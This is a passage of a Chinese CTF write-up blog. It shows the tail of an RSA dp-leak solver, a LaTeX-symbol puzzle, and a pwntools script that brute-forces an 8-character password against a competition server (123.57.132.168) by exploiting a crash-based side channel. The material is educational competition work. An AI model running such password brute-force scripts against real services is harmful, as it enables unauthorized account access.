<span class="number">23</span>,</span><br><span class="line">       <span class="number">226</span>, <span class="number">220</span>, <span class="number">201</span>, <span class="number">5</span>, <span class="number">71</span>, <span class="number">241</span>, <span class="number">195</span>, <span class="number">75</span>, <span class="number">191</span>, <span class="number">237</span>, <span class="number">108</span>, <span class="number">141</span>, <span class="number">141</span>, <span class="number">185</span>, <span class="number">76</span>, <span class="number">7</span>, <span class="number">113</span>, <span class="number">191</span>, <span class="number">48</span>, <span class="number">135</span>, <span class="number">139</span>, <span class="number">100</span>, <span class="number">83</span>, <span class="number">212</span>,</span><br><span class="line">       <span class="number">242</span>, <span class="number">21</span>, <span class="number">143</span>, <span class="number">255</span>, <span class="number">164</span>, <span class="number">146</span>, <span class="number">119</span>, <span class="number">173</span>, <span class="number">255</span>, <span class="number">140</span>, <span class="number">193</span>, <span class="number">173</span>, <span class="number">2</span>, <span class="number">224</span>, <span class="number">205</span>, <span class="number">68</span>, <span class="number">10</span>, <span class="number">77</span>, <span class="number">180</span>, <span class="number">24</span>, <span class="number">23</span>, <span class="number">196</span>, <span class="number">205</span>, <span class="number">108</span>,</span><br><span class="line">       <span class="number">28</span>, <span class="number">243</span>, <span class="number">80</span>, <span class="number">140</span>, <span class="number">4</span>, <span class="number">98</span>, <span class="number">76</span>, <span class="number">217</span>, <span class="number">70</span>, <span class="number">208</span>, <span class="number">202</span>, <span class="number">78</span>, <span class="number">177</span>, <span class="number">124</span>, <span class="number">10</span>, <span class="number">168</span>, <span class="number">165</span>, <span class="number">223</span>, <span class="number">105</span>, <span class="number">157</span>, <span class="number">152</span>, <span class="number">48</span>, <span class="number">152</span>, <span class="number">51</span>, <span class="number">133</span>,</span><br><span class="line">       <span class="number">190</span>, <span class="number">202</span>, <span class="number">136</span>, <span class="number">204</span>, <span class="number">44</span>, <span class="number">33</span>, <span class="number">58</span>, <span class="number">4</span>, <span class="number">196</span>, <span class="number">219</span>, <span class="number">71</span>, <span class="number">150</span>, <span class="number">68</span>, <span class="number">162</span>, <span class="number">175</span>, <span class="number">218</span>, <span class="number">173</span>, <span class="number">19</span>, <span class="number">201</span>, <span class="number">100</span>, <span class="number">100</span>, <span class="number">85</span>, <span class="number">201</span>, <span class="number">24</span>, <span class="number">59</span>,</span><br><span class="line">       <span class="number">186</span>, <span class="number">46</span>, <span class="number">130</span>, <span class="number">147</span>, <span class="number">219</span>, <span class="number">22</span>, <span class="number">81</span>]</span><br><span class="line">seeds = [<span class="number">4827</span>, <span class="number">9522</span>, <span class="number">552</span>, <span class="number">880</span>, <span class="number">7467</span>, <span class="number">7742</span>, <span class="number">9425</span>, <span class="number">4803</span>, <span class="number">6146</span>, <span class="number">4366</span>, <span class="number">1126</span>, <span class="number">4707</span>, <span class="number">1138</span>, <span class="number">2367</span>, <span class="number">1081</span>, <span class="number">5577</span>, <span class="number">4592</span>, <span class="number">5897</span>, <span class="number">4565</span>,</span><br><span class="line">         <span class="number">2012</span>, <span class="number">2700</span>, <span class="number">1331</span>, <span class="number">9638</span>, <span class="number">7741</span>, <span class="number">50</span>, <span class="number">824</span>, <span class="number">8321</span>, <span class="number">7411</span>, <span class="number">6145</span>, <span class="number">1271</span>, <span class="number">7637</span>, <span class="number">5481</span>, <span class="number">8474</span>, <span class="number">2085</span>, <span class="number">2421</span>, <span class="number">590</span>, <span class="number">7733</span>, <span class="number">9427</span>,</span><br><span class="line">         <span class="number">3278</span>, <span class="number">5361</span>, <span class="number">1284</span>, <span class="number">2280</span>, <span class="number">7001</span>, <span class="number">8573</span>, <span class="number">5494</span>, <span class="number">7431</span>, <span class="number">2765</span>, <span class="number">827</span>, <span class="number">102</span>, <span class="number">1419</span>, <span class="number">6528</span>, <span class="number">735</span>, <span class="number">5653</span>, <span class="number">109</span>, <span class="number">4158</span>, <span class="number">5877</span>, <span class="number">5975</span>,</span><br><span class="line">         <span class="number">1527</span>, <span class="number">3027</span>, <span class="number">9776</span>, <span class="number">5263</span>, <span class="number">5211</span>, <span class="number">1293</span>, <span class="number">5976</span>, <span class="number">7759</span>, <span class="number">3268</span>, <span class="number">1893</span>, <span class="number">6546</span>, <span class="number">4684</span>, <span class="number">419</span>, <span class="number">8334</span>, <span class="number">7621</span>, <span class="number">1649</span>, <span class="number">6840</span>, <span class="number">2975</span>,</span><br><span class="line">         <span class="number">8605</span>, <span class="number">5714</span>, <span class="number">2709</span>, <span class="number">1109</span>, <span class="number">358</span>, <span class="number">2858</span>, <span class="number">6868</span>, <span class="number">2442</span>, <span class="number">8431</span>, <span class="number">8316</span>, <span class="number">5446</span>, <span class="number">9356</span>, <span class="number">2817</span>, <span class="number">2941</span>, <span class="number">3177</span>, <span class="number">7388</span>, <span class="number">4149</span>, <span class="number">4634</span>,</span><br><span class="line">         <span class="number">4316</span>, <span class="number">5377</span>, <span class="number">4327</span>, <span class="number">1774</span>, <span class="number">6613</span>, <span class="number">5728</span>, <span class="number">1751</span>, <span class="number">8478</span>, <span class="number">3132</span>, <span class="number">4680</span>, <span class="number">3308</span>, <span class="number">9769</span>, <span class="number">8341</span>, <span class="number">1627</span>, <span class="number">3501</span>, <span class="number">1046</span>, <span class="number">2609</span>, <span class="number">7190</span>,</span><br><span class="line">         <span class="number">5706</span>, <span class="number">3627</span>, <span class="number">8867</span>, <span class="number">2458</span>, <span class="number">607</span>, <span class="number">642</span>, <span class="number">5436</span>, <span class="number">6355</span>, <span class="number">6326</span>, <span class="number">1481</span>, <span class="number">9887</span>, <span class="number">205</span>, <span class="number">5511</span>, <span class="number">537</span>, <span class="number">8576</span>, <span class="number">6376</span>, <span class="number">3619</span>, <span class="number">6609</span>, <span class="number">8473</span>,</span><br><span class="line">         <span class="number">2139</span>, <span class="number">3889</span>, <span class="number">1309</span>, <span class="number">9878</span>, <span class="number">2182</span>, <span class="number">8572</span>, <span class="number">9275</span>, <span class="number">5235</span>, <span class="number">6989</span>, <span class="number">6592</span>, <span class="number">4618</span>, <span class="number">7883</span>, <span class="number">5702</span>, <span class="number">3999</span>, <span class="number">925</span>, <span class="number">2419</span>, <span class="number">7838</span>, <span class="number">3073</span>, <span class="number">488</span>,</span><br><span class="line">         <span class="number">21</span>, <span class="number">3280</span>, <span class="number">9915</span>, <span class="number">3672</span>, <span class="number">579</span>]</span><br><span class="line">dp = <span class="string">r&#x27;&#x27;</span></span><br><span class="line">rands = [[<span class="number">58</span>, <span class="number">53</span>, <span class="number">122</span>], [<span class="number">145</span>, <span class="number">124</span>, <span class="number">244</span>], [<span class="number">5</span>, <span class="number">19</span>, <span class="number">192</span>], [<span class="number">255</span>, <span class="number">23</span>, <span class="number">64</span>], [<span class="number">57</span>, <span class="number">113</span>, <span class="number">194</span>], [<span class="number">246</span>, <span class="number">205</span>, <span class="number">162</span>], [<span class="number">112</span>, <span class="number">87</span>, <span class="number">95</span>],</span><br><span class="line">         [<span class="number">215</span>, <span class="number">147</span>, <span class="number">105</span>], [<span class="number">16</span>, <span class="number">131</span>, <span class="number">38</span>], [<span class="number">234</span>, <span class="number">36</span>, <span class="number">46</span>], [<span class="number">68</span>, <span class="number">61</span>, <span class="number">146</span>], [<span class="number">148</span>, <span class="number">61</span>, <span class="number">9</span>], [<span class="number">139</span>, <span class="number">77</span>, <span class="number">32</span>], [<span class="number">96</span>, <span class="number">56</span>, <span class="number">160</span>],</span><br><span class="line">         [<span class="number">121</span>, <span class="number">76</span>, <span class="number">17</span>], [<span class="number">114</span>, <span class="number">246</span>, <span class="number">92</span>], [<span class="number">178</span>, <span class="number">206</span>, <span class="number">60</span>], [<span class="number">168</span>, <span class="number">147</span>, <span class="number">26</span>], [<span class="number">168</span>, <span class="number">41</span>, <span class="number">68</span>], [<span class="number">24</span>, <span class="number">93</span>, <span class="number">84</span>], [<span class="number">175</span>, <span class="number">43</span>, <span class="number">88</span>],</span><br><span class="line">         [<span class="number">147</span>, <span class="number">97</span>, <span class="number">153</span>], [<span class="number">42</span>, <span class="number">94</span>, <span class="number">45</span>], [<span class="number">150</span>, <span class="number">103</span>, <span class="number">127</span>], [<span class="number">68</span>, <span class="number">163</span>, <span class="number">62</span>], [<span class="number">165</span>, <span class="number">37</span>, <span class="number">89</span>], [<span class="number">219</span>, <span class="number">248</span>, <span class="number">59</span>], [<span class="number">241</span>, <span class="number">182</span>, <span class="number">8</span>],</span><br><span class="line">         [<span class="number">140</span>, <span class="number">211</span>, <span class="number">146</span>], [<span class="number">88</span>, <span class="number">226</span>, <span class="number">2</span>], [<span class="number">48</span>, <span class="number">150</span>, <span class="number">56</span>], [<span class="number">87</span>, <span class="number">109</span>, <span class="number">255</span>], [<span class="number">227</span>, <span class="number">216</span>, <span class="number">65</span>], [<span class="number">23</span>, <span class="number">190</span>, <span class="number">10</span>], [<span class="number">5</span>, <span class="number">25</span>, <span class="number">64</span>],</span><br><span class="line">         [<span class="number">6</span>, <span class="number">12</span>, <span class="number">124</span>], [<span class="number">53</span>, <span class="number">113</span>, <span class="number">124</span>], [<span class="number">255</span>, <span class="number">192</span>, <span class="number">158</span>], [<span class="number">61</span>, <span class="number">239</span>, <span class="number">5</span>], [<span class="number">62</span>, <span class="number">108</span>, <span class="number">86</span>], [<span class="number">123</span>, <span class="number">44</span>, <span class="number">64</span>], [<span class="number">195</span>, <span class="number">192</span>, <span class="number">30</span>],</span><br><span class="line">         [<span class="number">30</span>, <span class="number">82</span>, <span class="number">95</span>], [<span class="number">56</span>, <span class="number">178</span>, <span class="number">165</span>], [<span class="number">68</span>, <span class="number">77</span>, <span class="number">239</span>], [<span class="number">106</span>, <span class="number">247</span>, <span class="number">226</span>], [<span class="number">17</span>, <span class="number">46</span>, <span class="number">114</span>], [<span class="number">91</span>, <span class="number">71</span>, <span class="number">156</span>], [<span class="number">157</span>, <span class="number">43</span>, <span class="number">182</span>],</span><br><span class="line">         [<span class="number">146</span>, <span class="number">6</span>, <span class="number">42</span>], [<span class="number">148</span>, <span class="number">143</span>, <span class="number">161</span>], [<span class="number">108</span>, <span class="number">33</span>, <span class="number">139</span>], [<span class="number">139</span>, <span class="number">169</span>, <span class="number">157</span>], [<span class="number">71</span>, <span class="number">140</span>, <span class="number">25</span>], [<span class="number">28</span>, <span class="number">153</span>, <span class="number">26</span>], [<span class="number">241</span>, <span class="number">221</span>, <span class="number">235</span>],</span><br><span class="line">         [<span class="number">28</span>, <span class="number">131</span>, <span class="number">141</span>], [<span class="number">159</span>, <span class="number">111</span>, <span class="number">184</span>], [<span class="number">47</span>, <span class="number">206</span>, <span class="number">11</span>], [<span class="number">220</span>, <span class="number">152</span>, <span class="number">157</span>], [<span class="number">41</span>, <span class="number">213</span>, <span class="number">97</span>], [<span class="number">4</span>, <span class="number">220</span>, <span class="number">10</span>], [<span class="number">77</span>, <span class="number">13</span>, <span class="number">248</span>],</span><br><span class="line">         [<span class="number">94</span>, <span class="number">140</span>, <span class="number">110</span>], [<span class="number">25</span>, <span class="number">250</span>, <span class="number">226</span>], [<span class="number">218</span>, <span class="number">102</span>, <span class="number">109</span>], [<span class="number">189</span>, <span class="number">238</span>, <span class="number">66</span>], [<span class="number">91</span>, <span class="number">18</span>, <span class="number">131</span>], [<span class="number">23</span>, <span class="number">239</span>, <span class="number">190</span>], [<span class="number">159</span>, <span class="number">33</span>, <span class="number">72</span>],</span><br><span class="line">         [<span class="number">183</span>, <span class="number">78</span>, <span class="number">208</span>], [<span class="number">209</span>, <span class="number">213</span>, <span class="number">101</span>], [<span class="number">111</span>, <span class="number">50</span>, <span class="number">220</span>], [<span class="number">166</span>, <span class="number">104</span>, <span class="number">233</span>], [<span class="number">170</span>, <span class="number">144</span>, <span class="number">10</span>], [<span class="number">187</span>, <span class="number">87</span>, <span class="number">175</span>],</span><br><span class="line">         [<span class="number">195</span>, <span class="number">59</span>, <span class="number">104</span>], [<span class="number">165</span>, <span class="number">179</span>, <span class="number">179</span>], [<span class="number">99</span>, <span class="number">247</span>, <span class="number">153</span>], [<span class="number">195</span>, <span class="number">61</span>, <span class="number">100</span>], [<span class="number">223</span>, <span class="number">159</span>, <span class="number">165</span>], [<span class="number">230</span>, <span class="number">93</span>, <span class="number">184</span>], [<span class="number">87</span>, <span class="number">28</span>, <span class="number">35</span>],</span><br><span class="line">         [<span class="number">35</span>, <span class="number">122</span>, <span class="number">38</span>], [<span class="number">158</span>, <span class="number">188</span>, <span class="number">163</span>], [<span class="number">229</span>, <span class="number">192</span>, <span class="number">222</span>], [<span class="number">12</span>, <span class="number">12</span>, <span class="number">192</span>], [<span class="number">207</span>, <span class="number">95</span>, <span class="number">224</span>], [<span class="number">127</span>, <span class="number">113</span>, <span class="number">137</span>],</span><br><span class="line">         [<span class="number">22</span>, <span class="number">114</span>, <span class="number">143</span>], [<span class="number">13</span>, <span class="number">45</span>, <span class="number">144</span>], [<span class="number">70</span>, <span class="number">140</span>, <span class="number">211</span>], [<span class="number">57</span>, <span class="number">101</span>, <span class="number">42</span>], [<span class="number">132</span>, <span class="number">62</span>, <span class="number">129</span>], [<span class="number">40</span>, <span class="number">128</span>, <span class="number">124</span>], [<span class="number">1</span>, <span class="number">132</span>, <span class="number">161</span>],</span><br><span class="line">         [<span class="number">164</span>, <span class="number">33</span>, <span class="number">133</span>], [<span class="number">252</span>, <span class="number">201</span>, <span class="number">32</span>], [<span class="number">8</span>, <span class="number">18</span>, <span class="number">247</span>], [<span class="number">1</span>, <span class="number">88</span>, <span class="number">55</span>], [<span class="number">201</span>, <span class="number">135</span>, <span class="number">186</span>], [<span class="number">101</span>, <span class="number">254</span>, <span class="number">125</span>], [<span class="number">236</span>, <span class="number">196</span>, <span class="number">39</span>],</span><br><span class="line">         [<span class="number">148</span>, <span class="number">24</span>, <span class="number">103</span>], [<span class="number">101</span>, <span class="number">29</span>, <span class="number">253</span>], [<span class="number">97</span>, <span class="number">156</span>, <span class="number">64</span>], [<span class="number">90</span>, <span class="number">103</span>, <span class="number">91</span>], [<span class="number">50</span>, <span class="number">48</span>, <span class="number">80</span>], [<span class="number">206</span>, <span class="number">22</span>, <span class="number">93</span>], [<span class="number">11</span>, <span class="number">114</span>, <span class="number">174</span>],</span><br><span class="line">         [<span class="number">61</span>, <span class="number">132</span>, <span class="number">247</span>], [<span class="number">215</span>, <span class="number">32</span>, <span class="number">232</span>], [<span class="number">95</span>, <span class="number">128</span>, <span class="number">90</span>], [<span class="number">57</span>, <span class="number">35</span>, <span class="number">228</span>], [<span class="number">163</span>, <span class="number">143</span>, <span class="number">107</span>], [<span class="number">178</span>, <span class="number">250</span>, <span class="number">28</span>], [<span class="number">64</span>, <span class="number">107</span>, <span class="number">225</span>],</span><br><span class="line">         [<span class="number">106</span>, <span class="number">115</span>, <span class="number">207</span>], [<span class="number">85</span>, <span class="number">134</span>, <span class="number">21</span>], [<span class="number">118</span>, <span class="number">201</span>, <span class="number">76</span>], [<span class="number">234</span>, <span class="number">34</span>, <span class="number">22</span>], [<span class="number">241</span>, <span class="number">236</span>, <span class="number">122</span>], [<span class="number">111</span>, <span class="number">185</span>, <span class="number">127</span>], [<span class="number">1</span>, <span class="number">26</span>, <span class="number">164</span>],</span><br><span class="line">         [<span class="number">254</span>, <span class="number">57</span>, <span class="number">117</span>], [<span class="number">243</span>, <span class="number">27</span>, <span class="number">32</span>], [<span class="number">161</span>, <span class="number">88</span>, <span class="number">80</span>], [<span class="number">50</span>, <span class="number">165</span>, <span class="number">93</span>], [<span class="number">87</span>, <span class="number">182</span>, <span class="number">216</span>], [<span class="number">184</span>, <span class="number">159</span>, <span class="number">63</span>], [<span class="number">167</span>, <span class="number">166</span>, <span class="number">123</span>],</span><br><span class="line">         [<span class="number">37</span>, <span class="number">78</span>, <span class="number">33</span>], [<span class="number">186</span>, <span class="number">81</span>, <span class="number">58</span>], [<span class="number">48</span>, <span class="number">3</span>, <span class="number">239</span>], [<span class="number">70</span>, <span class="number">186</span>, <span class="number">13</span>], [<span class="number">56</span>, <span class="number">108</span>, <span class="number">178</span>], [<span class="number">54</span>, <span class="number">55</span>, <span class="number">235</span>], [<span class="number">105</span>, <span class="number">180</span>, <span class="number">105</span>],</span><br><span class="line">         [<span class="number">16</span>, <span class="number">194</span>, <span class="number">98</span>], [<span class="number">136</span>, <span class="number">11</span>, <span class="number">41</span>], [<span class="number">18</span>, <span class="number">203</span>, <span class="number">79</span>], [<span class="number">185</span>, <span class="number">114</span>, <span class="number">170</span>], [<span class="number">148</span>, <span class="number">181</span>, <span class="number">223</span>], [<span class="number">118</span>, <span class="number">57</span>, <span class="number">160</span>], [<span class="number">23</span>, <span class="number">250</span>, <span class="number">181</span>],</span><br><span class="line">         [<span class="number">235</span>, <span class="number">219</span>, <span class="number">228</span>], [<span class="number">44</span>, <span class="number">151</span>, <span class="number">38</span>], [<span class="number">185</span>, <span class="number">224</span>, <span class="number">134</span>], [<span class="number">42</span>, <span class="number">162</span>, <span class="number">122</span>], [<span class="number">3</span>, <span class="number">9</span>, <span class="number">158</span>], [<span class="number">129</span>, <span class="number">245</span>, <span class="number">2</span>], [<span class="number">66</span>, <span class="number">241</span>, <span class="number">92</span>],</span><br><span class="line">         [<span class="number">80</span>, <span class="number">124</span>, <span class="number">36</span>]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_dp</span>(<span class="params">n, p, e, c</span>):</span></span><br><span class="line">    q = n // p</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        d = invert(e, phi)</span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">        flag = long_to_bytes(m)</span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(seeds)):</span><br><span class="line">    random.seed(seeds[i])</span><br><span class="line">    rands = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">        rands.append(random.randint(<span class="number">0</span>, <span class="number">255</span>))</span><br><span class="line">        <span class="built_in">print</span>(rands)</span><br><span class="line">    dp += <span class="built_in">chr</span>(res[i] ^ rands[i % <span class="number">4</span>])</span><br><span class="line">dp = <span class="built_in">int</span>(dp)</span><br><span class="line"><span class="keyword">for</span> X <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">    <span class="comment"># e * dp == (p-1) * X + 1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> == (e*dp-<span class="number">1</span>) % X:</span><br><span class="line">        p = (e*dp-<span class="number">1</span>) // X + <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">0</span> == n % p:</span><br><span class="line">            flag = leak_dp(n, p, e, ct)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>这里需要注意，出题人应该是用python2跑的，因为python3跑出来的随机数和题目中不一样</p>
<h2 id="Crypto-secret-share（unsolved）"><a href="#Crypto-secret-share（unsolved）" class="headerlink" title="Crypto-secret_share（unsolved）"></a>Crypto-secret_share（unsolved）</h2><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>不管别人怎么说，这次题目还是挺好的，有些地方有些可惜，且行且变强吧</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20211211 MT</title>
    <url>/posts/b83e9e49/</url>
    <content><![CDATA[<p>回到了梦开始的地方，半年前的黄袋鼠，刚开始写博客</p>
<span id="more"></span>
<h1 id="美团"><a href="#美团" class="headerlink" title="美团"></a>美团</h1><h2 id="Symbol"><a href="#Symbol" class="headerlink" title="Symbol"></a>Symbol</h2><p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211211110149283.png" alt="image-20211211110149283"></p>
<p>$\flat\ \lambda\ \alpha\ \gamma\ \lbrace\forall\ \uplus\ \nu\ _\ \Lambda\ \alpha\ T\ \epsilon\ \Xi\ _\ M\ \approx\ \triangleleft\ \hbar\rbrace$</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\flat\ \lambda\ \alpha\ \gamma\ \&#123;\forall\ \uplus\ \nu\ \_\ \Lambda\ \alpha\ T\ \epsilon\ \Xi\ \_\ M\ \approx\ \triangleleft\ \hbar\&#125;</span><br></pre></td></tr></table></figure>

<p>我超，发现了不得了的东西</p>
<blockquote>
<p>flag{fun_LaTeX_Math}</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">pl = <span class="string">b&#x27;fun_LaTeX_Math&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;flag&#123;&#123;<span class="subst">&#123;md5(pl).digest().<span class="built_in">hex</span>()&#125;</span>&#125;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{e1b217dc3b5e90b237b45e0a636e5a86}</p>
</blockquote>
<h2 id="Romeo’s-Encrypting-Machine"><a href="#Romeo’s-Encrypting-Machine" class="headerlink" title="Romeo’s Encrypting Machine"></a>Romeo’s Encrypting Machine</h2><p>是这样的</p>
<p>这道题主要考我们爆破，目标密码长度为8，范围是100个可打印字符，每次nc连上有100s的时间</p>
<p>要知晓一个关键的地方，就是如果猜对前面所有的字符（还不满8个），程序就不会动了，因为服务端会报下标越界的错导致程序退出</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211212122335636.png" alt="image-20211212122335636"></p>
<p>而在客户端的现象是：没有任何现象</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211212122424601.png" alt="image-20211212122424601"></p>
<p>其他的情况程序则会返回一个<code>False!</code>并继续让你输入</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211212142230214.png" alt="image-20211212142230214"></p>
<p>此外有一个循环会占用很多时间</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">check = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x2000</span>):</span><br><span class="line">    check = self.aes.encrypt(padding(check[:-<span class="number">1</span>] + str1[:i+<span class="number">1</span>]))</span><br></pre></td></tr></table></figure>

<p>也有一个判断可以在前面的check过之后加速后面的check（跳过上面的循环</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> right_num &gt; true_num:</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    right_num = true_num</span><br></pre></td></tr></table></figure>

<p>所以，一种完全自动化脚本的编写思路就是依序爆破<code>printable</code>，到100s主动掐掉，下次再从没爆完的地方（包括之前一次已经开始爆但没有回显的）开始继续爆，直到在某一次一次连接只爆破一位，还没有任何回显的，那应该就是正确的</p>
<p>不过比赛的时候太急了，不知道是不是一个靶机同时连多个会影响速度，还是那边网速的原因（出现了send过去之后没有任何回显，结果另外一次又<code>False!</code>的情况，崩溃~，本地跑就贼快），总之半自动化脚本（开始可以一次10个，后面就差不多一次3个）加上最后基本上全手爆了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solve</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.sh = remote(<span class="string">&#x27;123.57.132.168&#x27;</span>, <span class="number">15906</span>)</span><br><span class="line">        self.ru = <span class="keyword">lambda</span> s: self.sh.recvuntil(s)</span><br><span class="line">        self.sl = <span class="keyword">lambda</span> s: self.sh.sendline(s)</span><br><span class="line">        self.rl = <span class="keyword">lambda</span>: self.sh.recvline()</span><br><span class="line">        self.pwd = <span class="string">&#x27;#G.5~1&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">self</span>):</span></span><br><span class="line">        index_l = </span><br><span class="line">        index_r = </span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">list</span>(printable[index_l:index_r])):</span><br><span class="line">                t = self.pwd + i</span><br><span class="line">                self.rl()  <span class="comment"># [~]Please input your password:</span></span><br><span class="line">                self.sl(t.encode())</span><br><span class="line">                feedback = self.rl()  <span class="comment"># False!</span></span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&#x27;False!&#x27;</span> <span class="keyword">in</span> feedback:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">            self.sh.close()</span><br><span class="line">            self.sh = remote(<span class="string">&#x27;123.57.132.168&#x27;</span>, <span class="number">15906</span>)</span><br><span class="line">            index_l += </span><br><span class="line">            index_r += </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solution = Solve()</span><br><span class="line">    solution.solve()</span><br></pre></td></tr></table></figure>

<p>得到密码是<code>#G.5~1ss</code></p>
<blockquote>
<p>flag{c7f37603-7ad2-4d52-8a56-7c92c74dff97}</p>
</blockquote>
<hr>
<p>赛后重新写下代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">table = printable</span><br><span class="line">length = <span class="built_in">len</span>(printable)</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">sh.close()</span><br><span class="line">sl = <span class="keyword">lambda</span> s: sh.sendline(s)</span><br><span class="line">rl = <span class="keyword">lambda</span>: sh.recvline()</span><br><span class="line"></span><br><span class="line">pwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line">t = pwd</span><br><span class="line">index = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">tip = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">start_time = time.time()</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        sh = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">9999</span>)</span><br><span class="line">        tip = <span class="number">1</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            signal.alarm(<span class="number">105</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(index, length)):</span><br><span class="line">                t = pwd + table[i]</span><br><span class="line">                rl()</span><br><span class="line">                sl(t.encode())</span><br><span class="line">                feedback = rl()</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&#x27;False!&#x27;</span> <span class="keyword">in</span> feedback:</span><br><span class="line">                    tip = <span class="number">0</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">elif</span> <span class="string">b&#x27;Success&#x27;</span> <span class="keyword">in</span> feedback:</span><br><span class="line">                    pwd = t</span><br><span class="line">                    tip = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">assert</span> <span class="number">1</span> == <span class="number">0</span></span><br><span class="line">            signal.alarm(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            sh.close()</span><br><span class="line">            <span class="keyword">if</span> tip:</span><br><span class="line">                pwd = t</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(pwd) == <span class="number">8</span>:</span><br><span class="line">                    end_time = time.time()</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;plz do not waste my time\nyou should pay me: <span class="subst">&#123;end_time - start_time&#125;</span>s&quot;</span>)</span><br><span class="line">                    rl()</span><br><span class="line">                    rl()</span><br><span class="line">                    sys.exit(<span class="number">0</span>)</span><br><span class="line">                index = <span class="number">0</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                index = i</span><br><span class="line">                sh.close()</span><br><span class="line">                <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<p>本地方跑贼快，是不是有点太快了？大多都不会跑满100s👴😄🌶</p>
